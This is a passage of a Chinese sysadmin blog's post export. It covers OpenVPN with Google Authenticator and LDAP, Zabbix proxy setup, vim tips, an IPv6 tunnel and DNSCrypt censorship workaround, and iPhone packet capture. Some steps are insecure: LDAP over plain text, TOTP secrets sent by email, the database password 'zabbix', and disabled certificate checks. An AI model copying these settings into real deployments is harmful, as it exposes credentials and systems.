域上</span></span><br><span class="line"><span class="comment"># 跟 OpenVPN 里登录的用户名匹配的属性</span></span><br><span class="line"><span class="comment"># AD 这里一般都是 sAMAccountName</span></span><br><span class="line">pam_login_attribute sAMAccountName</span><br><span class="line"><span class="comment"># ssl 设置是否使用加密，我司这里没有使用加密</span></span><br><span class="line">ssl off</span><br></pre></td></tr></table></figure>
<h4 id="etc-openvpn-xxx-conf"><a href="#etc-openvpn-xxx-conf" class="headerlink" title="/etc/openvpn/xxx.conf"></a>/etc/openvpn/xxx.conf</h4><p>这是 openvpn 服务器的主配置文件，”xxx” 用自己喜欢的字串替换，这个配置最重要的是以下两句：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">plugin /usr/lib64/openvpn/plugins/openvpn-plugin-auth-pam.so openvpn</span><br><span class="line">reneg-sec 36000</span><br></pre></td></tr></table></figure>
<p>这里配置的基本思想就是：</p>
<ul>
<li>把认证丢给系统的 pam 插件来做</li>
<li>这里的 openvpn 参数指的是 pam 的配置文件（路径在 /etc/pam.d/）</li>
<li>reneg-sec 是用来设置重新认证的时间间隔，这里是 10 小时。这个参数跟客户端的同样的参数取小者有效</li>
</ul>
<h4 id="etc-pam-d-openvpn"><a href="#etc-pam-d-openvpn" class="headerlink" title="/etc/pam.d/openvpn"></a>/etc/pam.d/openvpn</h4><p>这个配置文件是真正认证 openvpn 登录的配置文件，里面内容主要是以下几句：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">auth	required	pam_google_authenticator.so nullok forward_pass debug</span><br><span class="line">auth	required	pam_ldap.so use_first_pass debug</span><br><span class="line">account	required	pam_unix.so</span><br></pre></td></tr></table></figure>
<ul>
<li>第一行的 forward_pass 参数使得一次读入系统密码(ldap，也就是 AD 密码)和 google authenticator 的密码，然后把系统密码扔给后续的pam（也就是带有 use_first_pass 参数的pam模块）处理</li>
<li>第二行的 use_first_pass 上面已有讲到</li>
<li>前两行都带 debug 参数完全是调试的需要，生产环境可以不用</li>
<li>第三行是必须的，否则 openvpn 登录不上</li>
</ul>
<h3 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chkconfig openvpn on;</span><br><span class="line">service openvpn start;</span><br></pre></td></tr></table></figure>
<h3 id="用户初始化"><a href="#用户初始化" class="headerlink" title="用户初始化"></a>用户初始化</h3><p>因为 google authenticator 需要在每个用户的家目录里生成一个叫 .google_authenticator 的文件，里面存有密钥和几个一次性的超级认证码及其他一些配置，所以，我们需要在 openvpn 服务器上做一次初始化数据的工作。假设有 100 个用户要用这个系统登录 openvpn，用户名从 user1 到 user100，那么初始化脚本就是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..100&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	useradd user<span class="variable">$&#123;i&#125;</span></span><br><span class="line">	su -c \</span><br><span class="line">		<span class="string">"google-authenticator -t -f -d -w 17 -r 3 -R 30 -q"</span> \</span><br><span class="line">		user<span class="variable">$&#123;i&#125;</span></span><br><span class="line">	cat /home/user<span class="variable">$&#123;i&#125;</span>/.google_authenticator | \</span><br><span class="line">		mail -s <span class="string">"your .google_authenticator is:"</span> \</span><br><span class="line">		user<span class="variable">$&#123;i&#125;</span>@xxx.com</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>这里注意，在用户数据初始化的最后部分，将生成的 .google_authenticator 发给了每个用户自己。</p>
<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="软件安装及配置使用"><a href="#软件安装及配置使用" class="headerlink" title="软件安装及配置使用"></a>软件安装及配置使用</h3><h4 id="Google-Authenticator"><a href="#Google-Authenticator" class="headerlink" title="Google Authenticator"></a>Google Authenticator</h4><p>这个软件准确来讲不是必须在 openvpn 客户端上安装的软件，只不过这个软件是用来生成登录所需的 6 位动态数字密码的，一般安装在手机上。ios 系统和 android 系统分别在 app store 和 google play 里搜索 “google authenticator” 然后安装即可。</p>
<p>这个软件的使用也很简单，本地运行，根本不需要“科学上网”。具体以 iphone 版本为例：打开软件，第一次点击右上角“+”（加号）–&gt;手动输入验证码，然后：</p>
<ul>
<li>账号：随便填</li>
<li>密钥：.google_authenticator 文件（内容已经邮件发给个人）的第一行</li>
<li>基于时间：划到打开状态</li>
</ul>
<p>这样以后每次打开软件，都会看到每30秒生成一个新的6位数字，这就是二次认证的验证码</p>
<h4 id="OpenVPN客户端"><a href="#OpenVPN客户端" class="headerlink" title="OpenVPN客户端"></a>OpenVPN客户端</h4><p>OpenVPN 客户端软件各个平台都有很多，我们在 mac 下常用 tunnelblick，用啥不重要，重要的是要在配置文件里加一句话：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">reneg-sec 36000</span><br></pre></td></tr></table></figure>
<p>这个参数具体配多少随意，真正生效的是和服务器端同样的参数相比的小者，而本例中服务器端配的是 36000。</p>
<p>客户端软件使用时需要把手机放手边打开 Google Authenticator 应用，输入密码时输入系统密码+6位验证码这样的组合，比如，用户密码是 “woshimima”(不带引号)，手机上显示的6位验证码是 “123456”（不带引号），那么输入密码时我就要输入 “woshimima123456”（不带引号）</p>
<h2 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h2><p>在 OpenVPN 服务器上，使用前面安装的 pamtester 来测试 OpenVPN 认证，方法很简单，登录 OpenVPN 服务器，执行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pamtester openvpn san.zhang authenticate;</span><br><span class="line"><span class="comment"># 系统会提示输入密码和 Google Authenticator 的 6 位动态密码</span></span><br><span class="line"><span class="comment"># 一起输入，先输入域帐号 san.zhang 的密码</span></span><br><span class="line"><span class="comment"># 这个测试必须要通过，否则整个配置肯定是失败的</span></span><br></pre></td></tr></table></figure>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
<li><a href="https://github.com/google/google-authenticator-libpam" target="_blank" rel="noopener">google-authenticator@github</a></li>
<li><a href="https://github.com/google/google-authenticator-libpam/blob/master/contrib/README.rpm.md" target="_blank" rel="noopener">google-authenticator的rpm包制作官方文档</a>（注意：这个文档有问题，起码在 CentOS 6.x 下是有问题的）</li>
</ul>
]]></content>
      <categories>
        <category>System</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>AD</tag>
        <tag>OpenVPN</tag>
        <tag>Google Authenticator</tag>
        <tag>PAM</tag>
        <tag>Windows</tag>
        <tag>LDAP</tag>
        <tag>KVM</tag>
      </tags>
  </entry>
  <entry>
    <title>在VIM中重新格式化（代码）文件</title>
    <url>/2017/03/%E5%9C%A8VIM%E4%B8%AD%E9%87%8D%E6%96%B0%E6%A0%BC%E5%BC%8F%E5%8C%96%EF%BC%88%E4%BB%A3%E7%A0%81%EF%BC%89%E6%96%87%E4%BB%B6/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>需求来自于直接拷贝一段格式完好的 Bash 代码粘贴到一个新（用 vim）打开的 Bash 文件时，代码格式完全乱掉了，主要现象貌似是锁进格式被 double 了，本来是一个 tab 的好像被敲了两个 tab。这个问题怎么解决，不知道，不过马上的需求是：能否自动重新把代码重新格式化一下呢？</p>
<a id="more"></a>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="vim配置"><a href="#vim配置" class="headerlink" title="vim配置"></a>vim配置</h2><p>确保 vim 配置里有打开 filetype-indent，如果没有的话，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"filetype indent on"</span> &gt;&gt; ~/.vimrc</span><br></pre></td></tr></table></figure>
<h2 id="格式化代码"><a href="#格式化代码" class="headerlink" title="格式化代码"></a>格式化代码</h2><p>然后，打开需要重新格式化的代码文件，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim xxx.sh</span><br></pre></td></tr></table></figure>
<p>最后，在 vim 中直接敲入命令（不用先敲入冒号）：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">gg=G</span><br></pre></td></tr></table></figure>
<p>成功！</p>
<h1 id="进阶阅读"><a href="#进阶阅读" class="headerlink" title="进阶阅读"></a>进阶阅读</h1><p>至于怎样格式化代码文件，是控制在 vim 的 runtimepath 目录下的 indent 目录下的”格式名.vim”这个文件里的，这里的格式名是 vim 自动检测到的你的文件的格式，比如：sh</p>
<p>至于什么是 runtimepath，在 vim 中敲入</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:<span class="keyword">help</span> runtimepath</span><br></pre></td></tr></table></figure>
<p>自己看吧</p>
]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Vim</tag>
        <tag>indent</tag>
        <tag>Code</tag>
        <tag>runtimepath</tag>
        <tag>filetype-indent-on</tag>
      </tags>
  </entry>
  <entry>
    <title>在Ubuntu16.04上部署Zabbix-proxy3.4的流水账</title>
    <url>/2018/06/%E5%9C%A8Ubuntu16-04%E4%B8%8A%E9%83%A8%E7%BD%B2Zabbix-proxy3-4%E7%9A%84%E6%B5%81%E6%B0%B4%E8%B4%A6/index.html</url>
    <content><![CDATA[<h1 id="WHY"><a href="#WHY" class="headerlink" title="WHY"></a>WHY</h1><p>这里的为什么不是说为什么要装 <strong>zabbix-proxy</strong> 的问题，而是说为什么要写这篇文章。<br>为什么要写这篇文章呢？答案很简单，官方文档太碎了，东一榔头西一棒子，一个简单实际直接的问题：怎样在 <strong>ubuntu</strong> 上安装部署 <strong>zabbix-proxy</strong>，翻官方文档得翻四五篇文档，而且这四五篇文档中还有很多干扰信息，需要仔细分辨，否则会对部署造成负面影响。<br>所以，就有了这篇“流水账”。</p>
<h1 id="HOWTO"><a href="#HOWTO" class="headerlink" title="HOWTO"></a>HOWTO</h1><h2 id="INSTALLATION"><a href="#INSTALLATION" class="headerlink" title="INSTALLATION"></a>INSTALLATION</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装 zabbix 官方的 ubuntu 16.04(版本号 xenial) 的软件仓</span></span><br><span class="line">wget \</span><br><span class="line">    https://repo.zabbix.com/zabbix/3.4/ubuntu/pool/main/z/zabbix-release/zabbix-release_3.4-1+xenial_all.deb;</span><br><span class="line">dpkg -i zabbix-release_3.4-1+xenial_all.deb;</span><br><span class="line">apt-get update;</span><br><span class="line"><span class="comment"># 安装 zabbix-proxy 所需之 mysql 数据库服务器软件</span></span><br><span class="line"><span class="comment"># 注意这一步会让设置 mysql 服务器的 root 密码（不是系统密码！）</span></span><br><span class="line"><span class="comment"># 这个要记住，在执行下一步操作的时候要输入的</span></span><br><span class="line">apt-get install mysql-server-5.7;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用 root 身份连入 mysql 数据库系统并进入交互式模式</span></span><br><span class="line"><span class="comment"># 注意：这里需要输入上一步设置的 root 的密码</span></span><br><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建 zabbix-proxy 系统所用数据库：zabbix</span><br><span class="line">create database zabbix character set utf8 collate utf8_bin;</span><br><span class="line"># 创建 zabbix-proxy 应用所用数据库账号：zabbix 并其密码以及响应权限</span><br><span class="line">grant all privileges on zabbix.* to zabbix@localhost identified by &apos;zabbix&apos;;</span><br><span class="line"># 使权限及时生效</span><br><span class="line">flush privileges;</span><br><span class="line"># 退出 mysql 交互式环境</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装一些 zabbix-proxy 系统可能会需要</span></span><br><span class="line"><span class="comment"># 但又未在 zabbix-proxy-mysql 软件包里</span></span><br><span class="line"><span class="comment"># 明确指定依赖的软件包，</span></span><br><span class="line"><span class="comment"># 这里对于有用 snmp 监控网络设备的场景来讲非常重要</span></span><br><span class="line"><span class="comment"># 因为缺省是不会安装 snmp-mibs-downloader 之类</span></span><br><span class="line"><span class="comment"># 必须的软件包的。</span></span><br><span class="line"><span class="comment"># 注意，同时也安装上了 zabbix-agent，这个是无所谓的，</span></span><br><span class="line"><span class="comment"># 毕竟，所有的服务器都要装 zabbix-agent 不是吗</span></span><br><span class="line">apt-get install \</span><br><span class="line">    libsnmp-base \</span><br><span class="line">    snmp-mibs-downloader \</span><br><span class="line">    snmp \</span><br><span class="line">    libsnmp30 \</span><br><span class="line">    zabbix-proxy-mysql \</span><br><span class="line">    zabbix-agent;</span><br><span class="line"><span class="comment"># 创建 zabbix-proxy 需要的数据库结构及一些初始数据</span></span><br><span class="line">zcat \</span><br><span class="line">    /usr/share/doc/zabbix-proxy-mysql/schema.sql.gz \</span><br><span class="line">     | mysql -uzabbix -p zabbix;</span><br></pre></td></tr></table></figure>
<h2 id="CONFIGURATION"><a href="#CONFIGURATION" class="headerlink" title="CONFIGURATION"></a>CONFIGURATION</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改 zabbix proxy 的设置文件</span></span><br><span class="line">vim /etc/zabbix/zabbix_proxy.conf</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改 zabbix agent 的配置文件</span></span><br><span class="line"><span class="comment"># 本来这个不是本文讨论的重点</span></span><br><span class="line"><span class="comment"># 只是部署 zabbix proxy 时都会部署 zabbix agent</span></span><br><span class="line">vim /etc/zabbix/zabbix_agentd.conf</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 最后，将几个服务设为自启动</span></span><br><span class="line">systemctl <span class="built_in">enable</span> mysql.service;</span><br><span class="line">systemctl <span class="built_in">enable</span> zabbix-proxy.service;</span><br><span class="line">systemctl <span class="built_in">enable</span> zabbix-agent.service;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Ubuntu</tag>
        <tag>Proxy</tag>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>在控制台右上角放置一个时钟</title>
    <url>/2017/03/%E5%9C%A8%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%8F%B3%E4%B8%8A%E8%A7%92%E6%94%BE%E7%BD%AE%E4%B8%80%E4%B8%AA%E6%97%B6%E9%92%9F/index.html</url>
    <content><![CDATA[<h1 id="tput-版本"><a href="#tput-版本" class="headerlink" title="tput 版本"></a>tput 版本</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> sleep 1</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  tput sc</span><br><span class="line">  tput cup 0 $(($(tput cols)-29))</span><br><span class="line">  date</span><br><span class="line">  tput rc</span><br><span class="line"><span class="keyword">done</span> &amp;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>解释下：</p>
<ul>
<li>tput sc # 记录下当前光标位置</li>
<li>tput cup 0 ….. # 这一句是更改光标到最上一行右起第 29 位置</li>
<li>date # 是打印下当前时间（28 个字符）</li>
<li>tput rc # 是恢复先前保留的光标位置</li>
</ul>
<h1 id="escape-codes-版本"><a href="#escape-codes-版本" class="headerlink" title="escape codes 版本"></a>escape codes 版本</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> -ne <span class="string">"\e[s\e[0;<span class="variable">$((COLUMNS-27)</span>)H<span class="variable">$(date)</span>\e[u"</span></span><br><span class="line">  sleep 1</span><br><span class="line"><span class="keyword">done</span> &amp;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Bash</tag>
        <tag>commandlinefu</tag>
        <tag>console</tag>
        <tag>tput</tag>
        <tag>escape codes</tag>
      </tags>
  </entry>
  <entry>
    <title>怎样在VIM中清除一个文件的内容</title>
    <url>/2013/10/%E6%80%8E%E6%A0%B7%E5%9C%A8VIM%E4%B8%AD%E6%B8%85%E9%99%A4%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9/index.html</url>
    <content><![CDATA[<p>本文来自于：<a href="http://www.commandlinefu.com/" target="_blank" rel="noopener">commandlinefu</a></p>
<p>方法很简单，用 vim 打开目标文件，直接敲入：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:%d</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>即可。其中：</p>
<ul>
<li>% 是匹配所有行</li>
<li>d 是删除的意思</li>
</ul>
<p>所以这个命令一执行，文件就被清空了。</p>
]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>commandlinefu</tag>
        <tag>Vim</tag>
        <tag>Vi</tag>
      </tags>
  </entry>
  <entry>
    <title>小型网络科学上网方案之ipv6篇</title>
    <url>/2016/09/%E5%B0%8F%E5%9E%8B%E7%BD%91%E7%BB%9C%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%96%B9%E6%A1%88%E4%B9%8Bipv6%E7%AF%87/index.html</url>
    <content><![CDATA[<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>这是适合小型网络（公司办公室或家庭）的”科学上网”方案之一的ipv6方案，此方案是我极同事搞的，我这里主要是学习，然后做过在路由器上封来自于公网ipv6网往小型网络内部的机器（都有正式ipv6地址）的访问。</p>
<p>点评下：<br>思路灰常灵活，非常适用于办公网、家庭网的“科学上网”方案</p>
<h2 id="所用资源"><a href="#所用资源" class="headerlink" title="所用资源"></a>所用资源</h2><ol>
<li>路由器<ul>
<li>极一（跑openwrt）</li>
<li>ip地址（私网）：10.0.0.5</li>
<li>ip地址（公网）：3.3.3.3</li>
</ul>
</li>
<li>虚机<ul>
<li>IPV6</li>
<li>2.2.2.2</li>
<li>dnscrypt-wrapper(optional)<ul>
<li>用来配合 dnscrypt-proxy 直连，破除 dns 污染</li>
</ul>
</li>
</ul>
</li>
<li>DNSCrypt-proxy(optional)<ul>
<li>解决某些域名被 dns 污染的问题。</li>
</ul>
</li>
<li>HE的账号</li>
</ol>
<a id="more"></a>
<table border="1" cellpadding="1" cellspacing="0"><tbody><tr><td>地址</td><td><a href="https://www.tunnelbroker.net/" target="_blank" rel="noopener">https://www.tunnelbroker.net/</a></td></tr><tr><td>账号</td><td>xxxxxx</td></tr><tr><td>email</td><td><a href="mailto:admin@xxxxxx.xx" target="_blank" rel="noopener">admin@xxxxxx.xx</a></td></tr><tr><td>prefix</td><td>2001:xxx:xxxx::/48</td></tr><tr><td>server’s ipv4 address</td><td>1.1.1.1</td></tr><tr><td>server’s ipv6 address</td><td>2001:xxx:xx:xxx::1/64</td></tr><tr><td>client’s ipv4 address</td><td>2.2.2.2</td></tr><tr><td>client’s ipv6 address</td><td>2001:xxx:xx:xxx::2/64</td></tr></tbody></table>

<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><ul>
<li>通过虚机(我司在oneasiahost买的，ip:2.2.2.2)从HE(HURRICANE ELECTRIC INTERNET SERVICES)的IPv6 Tunnel Broker上申请一段免费的ipv6地址（/48的）</li>
<li>然后通过小型网络内的路由器(ip是3.3.3.3)分配给局域网的客户端</li>
<li>路由器通过sit tunnel打到虚机2.2.2.2上</li>
<li>虚机2.2.2.2上起iptables，将sit过来的包(来自3.3.3.3)都转给HE（ip这里是：1.1.1.1）</li>
</ul>
<h1 id="详细配置"><a href="#详细配置" class="headerlink" title="详细配置"></a>详细配置</h1><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p>简单说，客户端只要接入此小型网络，并在本地启用了ipv6协议即可。</p>
<h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><ul>
<li><p>sit tunnel(文件/etc/config/network里)</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">config</span> interface 'sit1'</span><br><span class="line">        <span class="attribute">option</span> proto '6in4'</span><br><span class="line">        <span class="attribute">option</span> peeraddr '2.2.2.2'</span><br><span class="line">        <span class="attribute">option</span> ip6addr '2001:xxx:xx:xxx::2/64'</span><br><span class="line">        <span class="attribute">option</span> ip6prefix '2001:xxx:xxxx::/48'</span><br><span class="line"><span class="comment">#        option defaultroute '1'</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>iptables</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 允许sit1对端的机器的包出入路由器</span></span><br><span class="line">iptables -A INPUT -s 2.2.2.2/32 -i 6in4-sit1 -p ipv6 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -d 2.2.2.2/32 -o 6in4-sit1 -p ipv6 -j ACCEPT</span><br></pre></td></tr></table></figure>
</li>
<li><p>ip6tables</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip6tables -A INPUT -i 6in4-sit1 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">ip6tables -A INPUT -i 6in4-sit1 -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -j DROP</span><br><span class="line">ip6tables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">ip6tables -A INPUT -p ipv6-icmp -m icmp6 --icmpv6-type 128 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 30/min -j ACCEPT</span><br><span class="line">ip6tables -A FORWARD -i 6in4-sit1 -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -j DROP</span><br><span class="line">ip6tables -A OUTPUT -o 6in4-sit1 -p ipv6-icmp -j ACCEPT</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="虚机"><a href="#虚机" class="headerlink" title="虚机"></a>虚机</h2><p>iptables中的NAT表中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A PREROUTING -s 3.3.3.3/29 -p ipv6 -j DNAT --to-destination 1.1.1.1</span><br></pre></td></tr></table></figure>
<p>起 dnscrypt-wrapper：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install libsodium libevent;</span><br><span class="line"><span class="comment"># 准备软件环境</span></span><br><span class="line"><span class="built_in">cd</span> /root;</span><br><span class="line">git <span class="built_in">clone</span> --recursive git://github.com/cofyc/dnscrypt-wrapper.git;</span><br><span class="line"><span class="built_in">cd</span> dnscrypt-wrapper;</span><br><span class="line">make configure;</span><br><span class="line">./configure;</span><br><span class="line">make install;</span><br><span class="line"><span class="comment"># 安装 dnscrypt-wrapper</span></span><br><span class="line">dnscrypt-wrapper --gen-provider-keypair;</span><br><span class="line">dnscrypt-wrapper --gen-crypt-keypair --crypt-secretkey-file=1.key;</span><br><span class="line">dnscrypt-wrapper --gen-cert-file \</span><br><span class="line">  --crypt-secretkey-file=1.key \</span><br><span class="line">  --provider-cert-file=1.cert \</span><br><span class="line">  --provider-publickey-file=public.key \</span><br><span class="line">  --provider-secretkey-file=secret.key \</span><br><span class="line">  --cert-file-expire-days=3650;</span><br><span class="line">dnscrypt-wrapper --resolver-address=8.8.8.8:53 \</span><br><span class="line">  --listen-address=0.0.0.0:443 \</span><br><span class="line">  --provider-name=2.dnscrypt-cert.xxxxxxxx.com \</span><br><span class="line">  --crypt-secretkey-file=1.key \</span><br><span class="line">  --provider-cert-file=1.cert \</span><br><span class="line">  -d;</span><br><span class="line"><span class="comment"># "xxxxxxxx.com" 是随意写的，只要整个名字跟别的不重即可</span></span><br><span class="line">dnscrypt-wrapper --show-provider-publickey-fingerprint \</span><br><span class="line">  --provider-publickey-file public.key;</span><br><span class="line"><span class="comment"># 返回的 Provider public key fingerprint 记下来，跑 dnscrypt-proxy 时要用</span></span><br></pre></td></tr></table></figure>
<h2 id="DNSCrypt-proxy"><a href="#DNSCrypt-proxy" class="headerlink" title="DNSCrypt-proxy"></a>DNSCrypt-proxy</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate https://download.dnscrypt.org/dnscrypt-proxy/old/dnscrypt-proxy-1.4.0.tar.bz2;</span><br><span class="line">tar xjvf dnscrypt-proxy-1.4.0.tar.bz2;</span><br><span class="line"><span class="built_in">cd</span> dnscrypt-proxy-1.4.0;</span><br><span class="line">./configure --prefix=/opt/dnscrypt;</span><br><span class="line">make;</span><br><span class="line">make install;</span><br><span class="line"><span class="built_in">cd</span> /opt/dnscrypt/sbin;</span><br><span class="line">./dnscrypt-proxy --<span class="built_in">local</span>-address=10.0.0.7:53 \</span><br><span class="line">  --resolver-address=2.2.2.2:443 \</span><br><span class="line">  --provider-name=2.dnscrypt-cert.xxxxxxxx.com \</span><br><span class="line">  --provider-key= \</span><br><span class="line">B735:1140:206F:225D:3E2B:D822:D7FD:691E:A1C3:3CC8:D666:8D0C:BE04:BFAB:CA43:FB79 \</span><br><span class="line">  -d;</span><br><span class="line"></span><br><span class="line"><span class="comment"># "xxxxxxxx.com" 要跟前面的对应</span></span><br><span class="line"><span class="comment"># “B735:1140:206F:225D:3E2B:D822:D7FD:691E:A1C3:3CC8:D666:8D0C:BE04:BFAB:CA43:FB79”</span></span><br><span class="line"><span class="comment"># 是前面取的的 Provider public key fingerprint</span></span><br></pre></td></tr></table></figure>
<p>这里的10.0.0.7是私网的一台机器，在私网的dns服务器上可以把被污染了的域名的dns解析请求forward到10.0.0.7的53端口上来即可解决dns污染问题。</p>
<h2 id="HE"><a href="#HE" class="headerlink" title="HE"></a>HE</h2><p>HE无需专门配置。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="https://github.com/Cofyc/dnscrypt-wrapper" target="_blank" rel="noopener">dnscrypt-wrapper@github</a></li>
<li><a href="https://github.com/jedisct1/dnscrypt-proxy" target="_blank" rel="noopener">dnscrypt-proxy@github</a></li>
<li><a href="https://dnscrypt.org/" target="_blank" rel="noopener">DNSCrypt</a></li>
</ul>
]]></content>
      <tags>
        <tag>IPv6</tag>
        <tag>科学上网</tag>
        <tag>DNSCrypt</tag>
      </tags>
  </entry>
  <entry>
    <title>怎样在macOS上抓iPhone的数据包</title>
    <url>/2017/06/%E6%80%8E%E6%A0%B7%E5%9C%A8macOS%E4%B8%8A%E6%8A%93iPhone%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/index.html</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>老板有个移动办公的 APP 在公司使用无线网络时老报“超时”错误，于是就让解决这个问题。我们为了定位问题，做了几个测试：</p>
<ol>
<li>使用办公无线网络使用此 APP，错误可以重复、稳定复现</li>
<li>使用 4G 或在家使用此 APP，没有任何问题</li>
<li>把手机用 usb 连上电脑，让数据走电脑的有线来访问服务器，结果发现 APP 没有问题</li>
<li>把手机连上办公室其他 wifi 设备，发现使用 APP 也没有问题</li>
</ol>
<p>最后，还是要听手机上的网络数据包来分析问题。</p>
<a id="more"></a>
<h1 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h1><p>业界听手机数据包的几种方案，大都不太合适，因为基本原理就是把数据包先扔到电脑上，这样就能在电脑上来听包了，但这样的话，我们的数据都是走电脑到达服务器的，这样的场景我们测试了，从电脑的有线网络走是没有问题的！</p>
<p>当然，也不是所有的方案都不合适，这样的话也就不会有这篇文章了：）Xcode 的 xcode command line tools 中的工具 rvictl 就非常适合我们的场景。</p>
<h1 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h1><h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><p>安装 Xcode，然后安装 Xcode command line tools，这就不多说了。</p>
<h2 id="取得设备UDID"><a href="#取得设备UDID" class="headerlink" title="取得设备UDID"></a>取得设备UDID</h2><ol>
<li>iPhone 用数据线连上 macOS</li>
<li>在 macOS 上打开 iTunes</li>
<li>在 iPhone 这个设备上，Settings-&gt;Summary 中，右侧页面中找到 UDID 值（如果找不到，多次点击 ECID、Moel Identifier 或 Serial Number 即可找到）</li>
</ol>
<h2 id="映射虚拟网络设备"><a href="#映射虚拟网络设备" class="headerlink" title="映射虚拟网络设备"></a>映射虚拟网络设备</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rvictl -s &lt;udid&gt;;</span><br><span class="line"><span class="comment"># 这里的 &lt;udid&gt; 即为上一步看到的设备 UDID</span></span><br></pre></td></tr></table></figure>
<p>成功后会发现在 macOS 系统下多出一个网络设备：rvi0，这便是 iPhone 的“网络设备”在 macOS 上的映射，要听 iPhone 的数据包，直接听这个设备的包即可。</p>
<h2 id="听包"><a href="#听包" class="headerlink" title="听包"></a>听包</h2><p>这一步简单了，直接打开 Wireshark，然后选 rvi0 设备抓包就好了。或者是先用 tcpdump 对 rvi0 抓包，最后再用 Wireshark 分析。</p>
<p>附上 tcpdump 的命令行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo tcpdump -nn -i rvi0 -vvv -X -s 1024 -w iphone.wifi.pcap;</span><br><span class="line"><span class="comment"># 这里的 iphone.wifi.pcap 为数据包保存的数据文件</span></span><br><span class="line"><span class="comment"># 弄完可以扔给 Wireshark 分析</span></span><br></pre></td></tr></table></figure>
<p>开始听包后，直接操作手机使用 APP，尽量使得错误复现，多重复几次以后，Ctrl+C 终止掉听包程序 tcpdump，记得 iphone.wifi.pcap 可用于 Wireshark 分析</p>
